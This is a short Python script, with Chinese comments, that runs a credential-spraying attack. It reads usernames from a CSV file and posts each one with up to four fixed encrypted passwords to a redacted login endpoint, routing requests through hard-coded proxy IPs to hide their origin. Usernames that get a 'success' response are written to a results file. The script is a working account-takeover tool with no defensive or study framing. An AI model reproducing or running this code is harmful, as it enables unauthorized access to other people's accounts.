import csv
import time
import requests

proxy = '58.20.184.187:9091'

proxy3="221.122.91.64:9401"


proxies = {

    "http": "http://%(proxy)s/" % {'proxy': proxy},

    "http": "http://%(proxy)s/" % {'proxy': proxy3},

}
if __name__ == '__main__':
    a= open("E:\***\\test.csv",'r')
    reader=csv.reader(a)
    rows=[row for row in reader]
    #从csv文件中取出url链接，然后使用爬虫进行访问获取
    sum=0
    for j in rows:
        sum+=1
        print(j[3],j[4])
        resp1 = requests.get("http://www.baidu.com")
        resp2 = requests.get("http://www.baidu.com")
        resp3 = requests.get("http://www.baidu.com")
        resp4 = requests.get("http://www.baidu.com")

        url = "https://***/login/login.do"

        data1= {"username":j[3],"password":"yXJF7/NktyA="} # 字典 外层无引号
        data2={"username":j[3],"password":"3rpECSN7a20="}
        data3={"username":j[3],"password":"PTw/zpI5g+E="}
        data4={"username":j[3],"password":"sxWO5cxKkEM="}
        resp1 = requests.post(url,data=data1,proxies=proxies)
        print(resp1.text)
        if "Given final*** padded" in resp1.text:
            resp2 = requests.post(url,data=data2,proxies=proxies)
            print(resp2.text)
            if "Given final*** padded" in resp2.text:
                resp3 =requests.post(url,data=data3,proxies=proxies)
                print(resp3.text)
                if "Given final*** padded" in resp3.text:
                            resp4 =requests.post(url,data=data4,proxies=proxies)
                            print(resp4.text)
        if ("success" in resp1.text) or ("success" in resp2.text) or ("success" in resp3.text) or ("success" in resp4.text):
            with open('E:\***\\test3.csv','a+',newline='',encoding='gb18030') as result:
                writer=csv.writer(result)
                writer.writerow([j[0],str(j[3]),j[4],j[5]])
